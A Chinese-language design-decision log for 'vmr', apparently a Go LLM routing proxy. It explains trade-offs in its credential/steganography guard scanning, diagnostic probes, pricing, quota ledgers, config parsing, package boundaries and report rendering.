- **`Hit.FP` 为确定性裸哈希（SHA-256 前 16 字节），不加盐，彻底移除 Salt 生命周期（K-G19）**：过度设计复核确认派生产物（报告与 JSON 切片）只展示凭据计数整数，从不序列化输出 FP 字符串；审计文件本身已是 100% 明文（K-G3），加盐无实际安全增益，反而因在线持久盐与离线随机盐不一致、以及跨 run 随机盐产生指纹漂移。降级为确定性哈希后在线、离线与标定工具同口径，彻底消灭漂移，同时删除 Salt 落盘/配置/警告等全套生命周期代码（原 ADR-11 废止，见 ADR-12）。**适用于**：任何"要不要恢复加盐 HMAC"的提议。
- **`guard.Hit`/`guard.Tier`/`guard.OutMode` 不下沉 `internal/core`，`guard` 维持 ADR-1 的 `{jsonscan}` 独立依赖白名单（K-G20）**：过度设计复核指出 `guard.Hit` 与 `audit.Hit` 镜像定义、`OutMode` 在 `config`/`guard` 两处各自声明、三处（在线/离线/标定工具）各自实现"按 (rule,fp) 折叠→计数→排序"的聚合算法。复核确认：① `OutMode` 部分的前提已随批次一（删除 `config.Guard.RulesVersion`）变化——`config` 现在完全不 import `guard`，统一会新增一条依赖换掉 `server/guard.go` 里一行零成本的类型转换，性价比比复核报告写作时更差；② `Hit`/`Tier` 结构体下沉的代价单方面压在 `guard` 头上（`report`/`audit` 早已 import `core`，零增量），而 `internal/core` 是持续演进的活跃包（全仓 800+ commit 里 60+ 个动过它），guard 依赖它会失去 ADR-1"不被 core 类型演化牵连"这条保证；③ `audit.Hit` 是永久落盘的 JSONL schema，`guard.Hit` 是内存态计算产物，`server/guard.go` 的 `toAuditHits()` 是两者之间唯一、显式的转换点——这是 wire format 与内存态类型分离的合理架构模式，不是意外重复，合并会让磁盘 schema 的稳定性隐式绑定到 `core` 的演化节奏上。三处聚合算法重复（~20 行 × 3）目前口径一致、从未观察到过真实漂移。**决定**：结构体/枚举维持现状不下沉；聚合逻辑重复维持观察，等出现真实漂移证据再抽公共函数，不预防性重构。`Hit.FP` 本身已按 K-G19 降级为确定性哈希——那是"指纹要不要加盐"的问题，与本条"类型定义要不要下沉 core"是两个独立问题。
- **`vmr analyze` 不提供 `-no-guard`/`-skip-guard` 一类跳过离线补扫的开关（K-G21）**：`internal/report/factscache.go` 的磁盘 Facts 缓存只按审计文件内容哈希键入，与运行时 flag 无关；若加一个"跳过扫描"开关，开关生效那次运行写入的空 `GuardScan` 会被当成该文件内容的正确结果落盘缓存，用户后续不带开关正常运行时，只要文件内容不变就会命中缓存、直接复用这份空结果——`macro/guard.json` 因此永久归零，且没有任何提示说明数据是被跳过而非真的干净。要安全地支持这类开关需要把开关状态编码进缓存 key 或 `CacheSchemaVersion`，复杂度和开关本来想省的那点耗时不成比例（guard 补扫相对不含 guard 的基线整体开销 +22.4%，已确认在性能预算内，见上面 M2 的并发安全条目）。**决定**：不做。**适用于**：任何"给非 guard 用户加个跳过开关"的提议，先看这条。
- **`scanInboundFacts`（`internal/report/guardscan.go`）对已在线盖章的记录仍无条件重扫 `Client.Request.Body`，不能靠 `len(arec.Guard.Hits) > 0` 短路（K-G22）**：这次重扫的目的不是重算 `Hits`——这条路径根本不写 `out.Hits`——而是拿到 `known`（本次请求里出现过的凭据明文），喂给入向凭据回显检测；`arec.Guard.Hits` 只存 `FP`（哈希），无法反推明文，`known` 只能靠重新扫描 body 得到。更关键的是 K-G16：在线扫描不解码 `\u` 转义，凭据若被转义会让在线 `Hits` 恒为 0——这恰好是离线复扫最该补上的场景，不是可以跳过的场景。任何"`Hits==0` 就跳过这次扫描"的优化提案，实质是关掉 K-G16 在回显检测这一层的补偿能力，是真实的能力回归，不是零风险的性能优化。**决定**：不做。整体 guard 扫描开销已评估为在性能预算内（见上面 M2 的条目），不为这一小块单独开洞。
- **M5 五探针矩阵（`internal/probe/guard.go`）维持一个命令，不按"安全 vs 保真度/计费诚实度"物理拆分成独立子命令（K-G23）**：探针 1（Tool Call 篡改）、5（隐写注入）是凭据/隐写安全检测，探针 2（长上下文截断）、3（思维链剥离）、4（Token 虚报）是中转站保真度/计费诚实度检测，两类威胁模型确实不同，但拆分理由站不住——五个探针共享同一套请求/校验机制，都通过显式 opt-in 的 `vmr diagnose -guard` 触发，都向真实端点发送真实请求、消耗真实 Token（这是 `vmr diagnose` 一直以来的既定行为，不是探针矩阵带来的新特性），拆分不会改变任何一个探针本身检测到什么、也不会降低任何风险。**决定**：维持一个命令；`-guard` 的 flag 帮助文本与 `internal/probe/guard.go` 的包注释已把两类探针的性质分开说明。**适用于**：任何"把探针矩阵拆成 `vmr diagnose -fidelity` 之类独立命令"的提议，先看这条。
- **入向净化重建 SSE 事件时，注释行（`:` 开头）在一种双重边缘情况下会被丢弃，不算遗留缺口（K-G24）**：`splitSSEEvent`/`rebuildSSEEvent` 只透传 `id:`/`event:`/`retry:`/`data:` 四类字段；`sanitizeEvent` 在一个事件块的 `data` 为空时直接原样返回整段原始字节（含任何注释行），只有 `data` 非空*且*该次扫描真的判定需要改写时才会走 `splitSSEEvent`→`rebuildSSEEvent` 的重建路径——真实上游的心跳注释（如 `: keepalive`）几乎总是独立、不带 `data:` 字段的事件块，因此从不触发重建，逐字节原样透传。唯一会丢注释行的场景是"同一事件块内既有注释行、又有命中隐写字符触发改写的 `data:` 字段"这种双重边缘情况，评估后判定影响面可忽略，不追加改动。
- **`Record.Guard.SanitizedRuneCounts` 与 `RuneCounts` 是互补而非重叠的两个字段，不合并（K-G25）**：`RuneCounts` 是离线重扫 `Client.Response.Body`（净化已发生之后的最终字节）得到的"最终留在响应里的"计数，`SanitizedRuneCounts` 是在线净化器自己记录的"净化前存在、已被剥除"的计数——对已净化的记录而言前者天然看不到后者剥除的部分，合并会混淆 K-G14 的核心区分（"已经发生的事" vs. 不存在的"被拦截的事"）。两者在 `internal/report` 里各自独立聚合、独立渲染（`viewmodel_guard.go`）。
- **价目表的数值防线建在 `pricing.ParseTable`，不下沉到 `internal/config`**：`ParseTable` 是标准/curated 表的唯一解析入口，config.yaml 的 `providers[].pricing.rates` 侧另有自己的 `positiveFinite`/`nonNegativeFinite`——两层各自的入口各自把关。NaN/±Inf/负费率一律加载期硬错误；定价与配额已彻底解耦，一条脏费率的影响面只污染离线 `vmr analyze` 的 $ 估算，触达不到 `quota.Counters`（该结构自身也不含任何价格分量）。
- **`internal/config` 的二层费率解析不后置到 `router.BuildSnapshot`**：`config` import `pricing`、在 `validate()` 跑完解析，看似「配置层反向侵入用例层」，但只让 `cmd/vmr` 一侧另行解析、config 侧完全不校验会导致两份实现各自推断、容易漂移，是已否决的备选（Quota 设计文档决策表明文选定）。后置到 `BuildSnapshot` 还会摧毁「费率行四分量全给或全不给、`aliases` 目标必须存在」这些加载期校验——它们的价值就在于**加载期**能立刻报错，而不是等 `vmr analyze`/`vmr check` 跑一次才发现打错的字。
- **org 前缀请求名的费率解析兜底是**递归**重跑裸名，且残余误匹配风险刻意接受**：带 org 前缀的上游名（openrouter 的 `meta-llama/...`、together 的 `google/gemma-...`）四步全落空后，`resolveCanonicalKey` 用 `pricing.ModelBasename` 掐成裸名**递归重跑全部四步**（含 `<provider>/<basename>` 步）——只重跑裸名/后缀步会让「同名不同写法在同一 provider 上解析到不同价」的不对称换个位置重现。不做的：按厂商维护 org 前缀注册表（太精确所以太脆）、全局归一化请求名（会失配账号层 `pricing.aliases`/`rates` 的原始名 key）。残余：网关自造 id 掐掉前缀后恰与另一模型裸名同名时会命中那家的价——与 substring 匹配同型的极小概率误匹配，可用 `pricing.aliases` 先钉（优先级更高）。
- **`report.yaml` 解析失败是硬错误退出，文件不存在才是静默 no-op**：严格解析（`KnownFields`）配上软降级是最坏组合——一个键名笔误会静默关掉**全部** report.yaml 设置，包括自流量排除（分析工具自己的开销于是混进被分析的工作负载）。文件不存在是合法的「未配置」；显式 `-report-config` 指向的文件不存在则报错，那是用户自己给的指针。报表头另有一行写明本次实际应用的配置文件路径（`Meta.ReportConfigPath`）——「没找到 report.yaml」和「本来就没有」在产物上必须可区分。
- **环境变量未定义时静默展开为空串，不支持 `${VAR:-default}`**：保持配置解析简单明确，默认值在 YAML 里显式写出。
- **配置形态的四个表达力边界**（ttl / endpoints / disabled / model_defaults 简化落地时敲定，无兼容层）：
  - **`ttl` 时间换算用固定长度近似**（d=24h、w=7d、mo=30d、y=365d，与 quota `every: 1mo` 同约定），额外接受裸整数=天；TTL→天数换算**向上取整**，避免亚天值被截断为 0 恰好落进 audit/imgprep 的「0 = 不删/不淘汰」旧语义。
  - **同一模型名在 `model_defaults` 里只能有一条声明**：`Config.ModelDefaults` 是 `map[string]ModelDefaultEntry`，重复 key 由 YAML 自身拒绝；exact key 与 `"*"` 通配同时匹配是回退链（exact 优先）不是合并，因此不存在取 max / 后写覆盖的问题。今天能表达的是「一条 entry，可选整体限定到某个 provider 子集」，**不是**「同一模型对不同 provider 子集各开一条不同取值」。**这条路今天没有变通方案**：虚拟模型层曾经的 `capabilities`/`max_context_tokens` 覆盖字段已整体移除（强行降级没有现实价值，且和"同一真实模型能力理应一致"的原则冲突，见 CHANGELOG）——真撞上这个场景，要么把需要不同上限的 (provider, model) 对拆到独立虚拟模型上，要么将 `model_defaults` 升级成 `map[string][]ModelDefaultEntry`，待真实需求出现再评估。
  - **`BuildQuotaSpecs` 双形态**：`BuildSnapshot` 路径走 `BuildQuotaSpecsDisabled`（跳过 disabled provider，不留无主计数器）；`BuildQuotaSpecs` 保持原行为供 `replay.chargeReplay` 使用（replay 定向单个 (provider, model)，解析其 quota spec 与在线路由状态无关，是正确语义而非兼容残留）。
  - **全 disabled 的 endpoint-group 保留空 route**：`(protocol, virtual model)` 路由仍在但零 endpoint，走常规 no-candidates 失败路径而非 unknown-model（测试钉住）。**disabled 引用告警逐引用点发**：一个 disabled provider 被 N 处引用产生 N 条 warning，每条点名具体位置；嫌吵再聚合为 per-provider 一条。
- **多协议适配器（`adapter/{openai,anthropic,openairesponses}`）保持独立子包**：三协议底层已有真实分叉（Anthropic 529 特判、Responses 顶层 `input` 数组与 `RewriteInputRoles`、`x-api-key` vs `Authorization`）；独立子包支持编译期 `init()` 注册与独立单测，新增协议零侵入。合并成参数化结构体只是把多态改写为字符串 `if` 分支。
- **不引入端点级通用运行时 quirks 插件系统**：坚持编译期确定性，只对已证实的厂商行为差异做受控修复。
- **`TopLevelProbe` 的契约是「探测」不是「校验」，不检查尾随字节**：它回答「这团字节是不是某个协议的对话请求」（结构探测，供 `RequestFacts` 与 sticky 指纹用），不承诺「字节流在探针返回的结构之后没有尾随垃圾」。加尾随检查会背离字节保真透传：透传层本就把原样字节直送上游，多余的校验只会把合法流量拦下来。
- **不合并 `Dimension`（排序）与 `Condition`（淘汰）**：淘汰依赖请求事实，排序只比较端点属性，职责分离保证接口纯粹。
- **ProviderGroup 的多 Key（`api_keys:`）已实现，运行时均衡与分级 Failover 仍不做**：运行时 KeyPool（请求期在池内随机选 Key）会违反 `core.Endpoint`「构造后不可变、`HealthKey()` 只算一次」这条贯穿 health/sticky/quota 的不变式。实际落地是「配置期展开成多个独立 `core.Endpoint`」：`Provider.APIKeys`（`{label: key}`）在 `config.Parse` 里展开成 `<name>-<label>` 命名的独立 `Provider` 并就地重写引用，下游全部按 `Provider.Name` 字符串解析、零改动。这个形状架构性地绕开了均衡（谁排第一不可预先指定，只能读 `vmr check` 的实际展开结果；没配 quota 时排第一的吃全部流量）与配额聚合（每把 key 独立 Provider 名、独立 quota 池）两个难题；分级 Failover（402 跳 Key / 5xx 跳 Provider）维持原判，留到看到真实需求。

### 1.3 校验与防御性编程

- **`/status` 的网络可达性与身份认证解耦，且复用聊天入口的同一把 `api_keys`**：网络范围由 `listen` 决定，认证由 `api_keys` 决定——未配 `api_keys` 时任何能连到端口的人都能读 `/status`。这把 key 同时是管理凭证：持有客户端 key 者能看到全部端点名、provider 身份、quota 消耗与配置路径。对单人/小团队代理这是正确的简化。`config.Check()` 对「非 loopback 且无 api_keys」给 warning。
- **`vmr status -addr` 回退读取本地 config 的 `api_keys[0]` 并发送到目标地址**：设计意图是让本机多实例免手工传 key；只发 key、不进 URL 或日志。目标地址是使用者自己敲的，不是网络层漏洞。
- **看板（`/status.html` / `/log.html`）把 API key 存 `localStorage`，静态外壳免鉴权直出**：外壳不含数据，数据请求走 `s.auth()`；key 只在浏览器本地持久化，不进 URL、不进服务端日志。所有配置派生字符串内插进 `innerHTML` 前均 `esc()` HTML 转义。`/log` 输出 `text/plain` 而非 SSE/JSONL（源头已是格式化文本）；无查询参数（回放窗口固定 512 行缓冲）。
- **`/help.html` / `/help.zh.html` 的 Agent 配置片段在浏览器就地装配，模型名 / effort / context 默认值不做服务端模板渲染**：`/help` 按架构必须公开免鉴权，服务端渲染这些值会逼它强制鉴权、或让服务端拿不到用户 Key。API Key 复用 `localStorage['vmr_status_key']`；服务端下发的 HTML 对这部分保留写死默认值，保证无 JS / 未鉴权时也自洽。**唯一例外**是 `{{BASE_URL_OPENAI}}` / `{{BASE_URL_ANTHROPIC}}` 两个占位符：`renderHelp` 按请求 Host 就地填成本实例地址（访客自己的地址、HTML 转义、不需要用户 Key），并有一段 JS 在代理重写 Host 时用 `location.origin` 复填。四点取舍：max-output 预算按 context 分档经验估计（VMR 无模型级元数据）；片段一律 vision-on（空 capabilities = 不受约束）；四个列表型生成器只枚举 `openai-completions` 模型；无浏览器 JS 测试基建，`TestHelpPage_SnippetFillEngine` 只做构建期字符串守卫。
- **`nil` 校验只加在跨包公共入口且一律 fail-fast，绝不静默兜底**：已加的是 `report.AnalyzeSessionsCached` 与 `journey.BuildChain`/`BuildAll`/`PreviewTitles` 四个入口——判据是「跨包公共 API + 后接并发扇出或递归组装」。包内被这些入口保护的函数不重复校验。
- **尤其不做「`prof == nil` 就回退到 `Generic`」这类静默兜底**：`OpenClawAware` 与 `Generic` 给出不同的任务标题与边界，静默换一个 Profile 会产出一份错误但看起来正常的分析结果，比 panic 难查。
- **持续性故障的日志按「错误文本相同」去重，不做事件级审计**：quota flush 失败（磁盘满、权限变更）与时钟回退都是持续性的，10 秒一次刷屏会淹没日志。flush 侧按错误文本去重（首次 + 每 10 次，附连续失败计数），时钟回退侧每进程最多一条 WARN。**已知代价**：两种错误交替出现时 flush 侧不去重（每 tick 一条——但交替本身就是有效信号）；时钟「回退→恢复→再回退」的第二次不再 WARN。**边界**：需要回退事件级审计的话，这里要换成带去抖窗口的计数器。
- **`vmr-quota.json` 的结构损坏整文件拒绝，绝不部分采纳**：静默丢掉一个 provider 的账本比报错更危险。版本戳不匹配、nil account map、null bucket 三者任一即视为损坏，由调用方 WARN + 从零开始——与既有的语法损坏路径同构。`version` 是真正的门而非「写而不校验」：有版本戳却不校验比没有更危险，下一个人会以为「有版本号所以安全」。
- **配额周期的惰性重置方向敏感**：只有周期真正前进（`ps > PeriodStart`）才重置计数。NTP 向后校正、VM 快照回滚、容器 TZ 变更都会让周期起点向后跳，而「不等即重置」会抹掉整个计费周期且随下次 Flush 落盘、不可恢复。反方向保留计数并 WARN。
- **原子写只做文件级 Sync，不做目录 fsync**：全仓的 CreateTemp+Rename 站点（quota 账本、audit 压缩、ctxgraph 解析缓存、reqdetail 证据、journey LLM 缓存）都不 fsync 父目录——掉电时 rename 的目录项可能未持久化，最近一次落盘可能丢失或回退。丢失代价分别是「统计计数回退到上次 flush」（quota，文件级 Sync 已做）与「缓存 miss 重算」（其余站点，靠读取侧的哈希/schema 校验把半写内容兜成 miss），全部落在各自 best-effort 契约内；而目录 fsync 每次落盘多一次系统调用，换来的只是把丢失窗口从「最近一个 flush 间隔」缩到零。若未来某站点升级为「不许丢」的契约（如计费级账本），在该站点单独补，而不是全仓统一加。
- **`fmtutil.DisplayZone` 保持裸 `var`，不封装线程安全访问器**：生产代码零写入点——全仓写入全在 `_test.go` 且相关测试无 `t.Parallel()`，`-race` 全绿。「让测试能确定性覆盖」本就是它存在的理由之一。
- **`.cache/parse/` 的分片文件名 = 内容哈希 = `FileCache` 的 map key，三者对齐，且不做孤儿回收 GC**：文件名即内容哈希使同名冲突天然不可能，反查代价取消（运维侧想按路径定位分片时 grep 分片内嵌的 `CanonicalPath` 即可），`LoadCacheDir` 仍是 best-effort 全扫描。`ctxgraph.SaveCacheDir` 只增量写入当前存在的分片，不删旧哈希孤儿——孤儿只是多占磁盘、永不扰乱命中，而缓存是完全可再生的派生产物，`vmr analyze` 可从空目录冷启动，「整目录删除重建」比任何 GC 更简单可靠。**结果取舍**：两个不同路径、内容相同的审计文件（备份副本与原件同批扫描）共享同一 entry，共享 Manifests 的 `Path` 绑定为 last-writer 的路径拼写——功能正确，但不保证指向最早扫到的路径。**触发条件**：`.cache/parse/` 体积超过同批压缩审计日志总体积，或升级后异常磁盘占用。
- **默认分析套件不物化 `details/`，`report` 的「文件」列判据是文件存在性而非 `-details` flag**：`writeJourneyFile` / `renderJourneys` / `renderAllJourneys` 带 `materializeDetails` 入参——只有单条下钻、`-compare`、`-render-all` 传 `true`；默认套件的脊柱「→ detail」与 sysprompt 指针渲染成行内「文件:行」坐标（`Manifest.Req` 的纯函数），不写盘、不留 404 链接。`report.detailCell` 因此不能只看本次的 `-details`：`vmr analyze` 先跑 journey 半区（可能已批量物化）再跑 report 半区，纯 flag 判据会谎报「没写详单」或反之——改查 `r.DetailFile` 是否真实存在（一次 `os.ReadDir` 建 set）。常驻守卫测试盯着「默认套件 `details/` 为 0、指针是坐标非链接」，人为改回无条件物化当场失败。这条纪律反复退化过多次，靠测试锁死。

### 1.4 包边界与依赖

- **`internal/server` 对 `chatmsg` 的传递依赖是既有豁免**：`archtest` 对 server 的禁 import 清单列 report/journey/ctxgraph/taskseg/reqdetail，**不列 chatmsg**——server 依赖 router，而 router（quota 计量、usage 解析）与 respnorm 合法消费 chatmsg，`go list -deps` 意义上的传递依赖必然成立。两半区契约守的是「server 不得直接消费分析半区的包」，不是依赖闭包纯洁性；把 chatmsg 从 router 剥离是另一个量级的改动且无消费者受益。
- **`archtest` 的包边界守卫是单向的，与规则本身同构**：「分析半区不 import 路由半区」是单向禁令，`import_boundaries_test` 只需要守这一半；「audit JSONL 记录是唯一耦合」那半句是**数据流事实**，不是另一条可机检的 import 规则。不要因为「只守了一半」提案加反向守卫——反向（路由 import 分析）本来就是合法的依赖方向。
- **`imgprep.ImageInfo` → `audit.ImageInfo` 的字段拷贝**：换 `imgprep` 不依赖 `audit`，保住公共工具包零依赖边界。
- **`chatmsg.ReassembleSSE` 与 `respnorm` 的 SSE 状态机保持分离**：前者面向离线完整语义提取，后者面向在线字节级保真转发，关注点不同。
- **`ctxgraph.Manifest.MsgIdx` 是承载性导出数据，不是死字段**：`ctxgraph` 不导出任何哈希函数，`MsgIdx` 是包外把 `Keys[i]` 对回 `chatmsg.Messages` 元素的**唯一通道**。两类消费方：`cmd/vmr` 的 `vmr diff` 用它把 manifest 哈希位置映射回真实消息角色（`tailLine` / `msgRoleAt`），是一等生产消费者；`internal/journey/structure_test.go` 用它验证「内容寻址坐标确实解析到所声称的内容」这条不变量。删掉它等于同时砍掉 `vmr diff` 与该不变量的包外验证，还要让全部用户白付一次全语料重解析。
- **`jsonscan` 与 `adapter` 的边界：按「引擎 vs 语义」切，不按「是否出现协议字段名」切**——「字节级扫描与 splice 改写引擎」整体归 `jsonscan`（含 `RewriteModel`/`RewriteRoles`/`RewriteInputRoles` 这类带协议字段字面量的改写函数，fuzz 覆盖也在此包）；「协议路由语义、适配器构造、错误分类」归 `adapter` 及以上。`adapter` 侧的协议字段字面量（`"model"`/`"stream"`/`"messages"`/`"input"`）也因此不从 `jsonscan` 导出复用：它们是不可变字节常量而非共享状态，「知道这些字段名的含义」正是把 `SessionFingerprint`/`TopLevelProbe` 留在 `adapter` 的领域知识。**不要再提案按字段名归属移动这批函数**。
- **`core` 准入规则是「禁令 + 显式豁免清单」，豁免项不是待清理项**：`Endpoint.HealthKey`/`Name`/`Freeze` 保留在 `core`——它们是「双半区无主、纯计算于 Endpoint 自身字段」的值对象方法（`HealthKey` 是 health/sticky/quota 共用的端点身份，`Freeze` 只是把两个纯函数 memoize 供快照构建），外移到任何单侧都会制造反向依赖或循环。`core.StickyBackstopTTL` 同理不迁回 `internal/sticky`：迁回制造一条 `config` → `sticky` 的新依赖边，仅用于读一个常量；不做这个校验则 `sticky_ttl` 超过 backstop 的配置会「看起来被接受、实际静默失效」。新增符号仍需逐个过审，但**不要再逐个提案外移这批豁免符号**。
- **`internal/core/core.go` 不按领域拆成 `endpoint.go`/`quota.go`/`pricing.go`**：同包拆文件不改变任何编译依赖，是代码导航整理不是架构重构。真正解决「core 会不会长成上帝包」的是准入规则，已写在包注释里并对存量逐条复核过。
- **`internal/probe` 不登记进 `allowedDepPackages`**：那张表的语义是「**承诺**永远零依赖（或一份明确的白名单）」，不是「当前碰巧零依赖的都登记」。`probe` 独立成包是为避免 `diagnose`→`router` import cycle，未来 import `core` 完全合理。（`rundir` / `buildinfo` / `sysinfo` 与 `tokenutil` 均作为基础叶子包登记守卫；`internal/guard` 登记了非空白名单 `{jsonscan}`，见该表注释。）
- **`internal/digest` 是全系统唯一的 Digest 构造**：D8 的「一个 cache-digest 构造」由结构而非差分测试保证——纯 stdlib 叶子包、零内部依赖，`internal/report` 是唯一调用方。线格式（uvarint 长度前缀 + sha256 链）由手算向量测试钉死。
- **`internal/report/cost.go` 的端点标签切分不并入 `core.SplitEndpointLabel`**：后者兼容 `:` 与 `/`，前者只认 `:`。放宽 `$` 成本估算那个调用点会改变旧格式日志的历史报表金额——一次需单独评审的行为变更，不是「统一实现」的顺带产物。
- **降级 token 估算的 fallback 刻意不对称：请求侧回退原始字节、响应侧一律 0**：统一规则是「用对内容最忠实的可用表示估算内容 token；剩余字节量到的若不是内容本身（SSE 信封、压缩/损坏的 opaque 字节），宁可为 0——量错一个量比没有估算更糟」，且每一侧都必须镜像路由半区实际扣减的基。两侧信息状态不同，同一规则推导出的分支就不同：请求侧的原始字节是「内容 + 脚手架」，且路由侧输入扣减（`Facts.EstimatedTokens`）本来就是 raw 基——回退 0 会让报表与实扣劈叉；响应侧的原始字节在截断/opaque 场景量的是传输不是生成（实测可达 71 倍虚高），回退 raw 等于把它复活。规则全权落在 `EstimateDegradedTokens` 的 doc comment（`internal/chatmsg/tokenest.go`）；不对称行为由 `TestEstimateDegradedBasis_FallbackAsymmetry` 钉死，对齐情形（两侧可提取文本、两侧 opaque）由 quota parity 测试钉死。**不要「统一」两侧的 fallback**——任何统一方向都已论证过是复现已修过的 bug。
- **用量折算（精确 vs 降级）的跨包入口刻意只有一条，没有单标志合并形式**：`quota.TokenCountersSides`（纯标量入参）是唯一权威实现，`router.TokenCountersSides` 是 `chatmsg.Usage`→`quota.TokenUsage` 的唯一翻译层（`report` 直接调 `quota` 侧，`archtest` 禁它 import `router`）。合并后的「some usage was seen」单比特信号无法区分完整账本与部分账本，把 partial 当 exact 记账正是 sides 拆分要消灭的 bug 类。**不要以「API 对称」或「给未来消费者留入口」名义复活单标志包装**——只能给单比特的调用方本就该逐侧决策。
- **quota parity 的非整数倍率差分用例直接驱动 `quota` 导出入口，不走 `buildProviderQuotaRows` 的 YAML 管线**：`cmd/vmr/quota_parity_test.go` 的 `TestQuotaParity_RequestsMetric_NonIntegerMultiplier` 用 `quota.ApplyModelMultiplier`/`quota.BaseAmount` 重算报表侧再与 `routerCharged` 对比（fixture 的 `quotaYAML` 不声明 `model_multipliers`，倍率轴经 YAML 表达不了）。取舍：这条用例的职责是钉住「N 次独立 float64 累加 vs 一次乘法」的公式级等价，报表侧必须复现 router 公式本身才能不与其实现漂移；端到端 basis（YAML → 行 → 与 router 对账）由不带倍率的 `TestQuotaParity_RequestsMetric_ReportMatchesRouter` 覆盖。**复核时机**：`buildProviderQuotaRows` 的倍率解析或 basis 计算发生变化时，重新评估是否补一条声明 `model_multipliers` 的 YAML 管线差分用例。
- **金额展示统一收敛在 `fmtutil` 一处**：`FmtCurrency`（恒两位小数 + 货币符号，`$124.36`/`¥34.20`）是所有「账面金额」的唯一格式；`FmtCurrencyPrecise`（四位小数）只用于单价/微额列（报表「端点性价比」章的成本/1M out 与成本/成功请求）。跨语言 fixture（dashboard testdata/fmt_cases.json）钉住 FmtCurrency/FmtCurrencyPrecise 两侧逐字节一致——两侧都按 Go strconv 的 half-to-even 口径对二进制精确平局舍入（`0.125` → `$0.12`），JS 侧不是裸 `toFixed`（那是 half-away-from-zero，平局值上会与 Go 差一分），而是 common.js 的 `goFixed` 全程 BigInt 精确复刻，fixture 内含平局 case 防回退。**不要在渲染层手写 `FormatFloat`/`toFixed`/`Sprintf("%.4f")` 渲染金额**；表格列的货币也可在表头标注，此时单元格内的符号属冗余但无害，不算漂移。非货币数字（token 数、统计量、配额余量）的 `toFixed(2)` 与此无关，不收编。
- **`imgprep` 的 `map[string]json.RawMessage` 不与 `jsonscan` 的字节扫描统一**：图片降采样要重算尺寸并重编码，是深度结构化重写，字节 splice 做不到。这是三个 sanctioned deviation 里最大的一个。
- **`imgprep.HasImageMarker` 的宽松预检维持「宁误报不漏报」，不收窄**：宽松的 `bytes.Contains` 预检会让正文里 `"image_path"` 之类的代码文本误触整套降采样反序列化——但误报只多付一次 JSON 解析成本，解析后结构化 dispatch 找不到真实图片块即原样放行，无正确性后果（`TestDownscaleTextMentioningMarkerIsNotAnImage` 钉死「误报≠误判」）。收窄需枚举全部已知图片引用形态 token，新增形态（如 Anthropic `tool_result` 子块 `type:"image"`）会重引漏报；漏报是硬路由 `HasImage` Condition 的正确性 bug，误报只是性能小税。
- **不对 OpenAI 工具返回做 `error:` 关键字模糊嗅探**：实测全量生产语料近 50 万条 OpenAI 工具调用结果，结构化 JSON 错误字段 0 条，全部是自由文本 stdout/stderr。子串模糊嗅探会引入海量代码输出/测试用例的假阳性。只对协议原生结构化错误标记（如 Anthropic `is_error`）做确定性统计。**已量化的代价**：这直接导致 `error_recovery_count`、Context Rot 区间错误率、N-gram 尾步错误率这三个行为指标在纯 OpenAI 协议流量下结构性恒为 0/n-a——2026-09-11 review 用真实语料验证过，占比越高的部署这个盲区越大。曾提案的"结构化字段优先 + 受控 bash 错误锚点文本匹配"两层方案经复核认定：第一层就是已被证明的空集（同一批语料 0 命中），第二层换个说法就是被否决的子串嗅探本身，均未提供绕开假阳性风险的新路径，故维持不做；这不是没考虑过，是考虑过两次都没有找到出路。
- **模型/端点展示面的一致性靠统一口径 + 契约测试，不靠共享结构体**：运行时视图以 `/status` 的 `models` 数组为唯一权威（`vmr status` CLI 与 `status.html` 直接消费同一 JSON）；人类可读模型标签 `"<name> [<protocol>]"` 只在 `fmtutil.ModelLabel` 一处定义。刻意不统一的三处：`/v1/models`（协议面 schema）、`vmr check` 的分层 config 视图（看配置缺口）与 `/status` 的聚合运行时视图（并集/最大值）、`vmr diagnose` 的扁平 Result 数组。`/status` JSON 形状由 `internal/server/admin_status_test.go` 契约测试锁定。
- **`i18n` 的一批微文件不合并**：与 `internal/report/viewmodel_*.go` 的「一节一文件」硬规则一一配对（`archtest` 强制），合并击穿全局行预算，且改一节文案从打开小文件变成在大文件里找。
- **`i18n` 里不含插值字段的 `type XxxText` + `if lang == ZH` 样板不改写**（`report_client_endpoint.go`/`report_compaction.go`/`report_toolwaste.go` 三个文件）：改写只消掉每文件 2 行分支，占体量的 struct 定义与两份字段赋值一行都省不掉。收益为负，**这三个文件维持现状是刻意的，不是阶段 D 落下的**。**含插值字段（`func(...) string` 这类闭包）的文件不适用这条判据**——所有含插值字段的 i18n 文件均采用 `Table[T]`（`internal/i18n/table.go`）+ 一次成型的 accessor（由 `TestArchitecture_I18nTableAdoption` 机械守卫），收敛的是被复制了两遍的闭包逻辑本身（含内部条件分支），不是分支去留；两者是不同的改法，判据不冲突。
- **不把分析半区拆成独立二进制**：坚持「单二进制单文件分发」。
- **不引入 DuckDB / cgo 做数据聚合**：保持纯 Go、跨平台零 C 依赖。
- **`go.mod` 保持裸模块名 `vmr`**：改名要动全项目 import 路径，无实质收益。

### 1.5 产出与工程惯例

- **用 Go 结构化代码而非 `text/template` 渲染 Markdown**：复杂条件列、对齐与动态脚注在 Go 里更容易保持类型安全和可读性。
- **不自建 Markdown→HTML 的渲染层**：Markdown 产物的人读入口就是 Markdown 阅读器与看板骨架页（后者直接消费 JSON 切片，不渲染 .md）；再要 web 化展示时，用现成渲染器做转换层，而不是在数据层养一个只覆盖子集的解析器。**推论**：`journey-viewer.html` 展示 LLM 解读等携带 markdown 表格/标题的正文时，按 `white-space: pre-wrap` 原样铺开，不做结构化渲染。
- **看板骨架页的 chrome 是英文单版，数据侧才本地化**（`WriteSkeletons(dir)` 只吃目录不吃语言，同一份 HTML 同时写进 `reports/` 与 `reports-en/`）：导航、tab、表头、banner、章节标题、`formatDelta` 的 `new` 之类**渲染器计算出的**文本恒英文；`rows[].label`、findings 叙述、LLM 正文、excerpt 等**由 JSON 携带语言**的部分跟随 `-lang`。于是 `reports/`（中文数据）下看板是「英文 chrome + 中文数据」。**不要把它当 bug 报**；要 chrome 也双语，正解是 `common.js` 持 `UI_TEXT[lang]` 字典 + `WriteSkeletons` 按产物语言注入 `window.__LANG`、对带 `data-i18n` 属性的静态文本节点做替换，约 1 人天，已登记为 §2.95 待办。
- **`-render-only` 在 L3 缓存命中时信任磁盘上已有 `.md` 产物**：L3 缓存以 ViewModel 指纹 + 渲染器版本 + 语言为判据；当 L3 命中且磁盘目标 `.md` 已存在时直接跳过渲染与写盘。手工改过 `.md` 需要强制重绘时用 `-no-cache`。
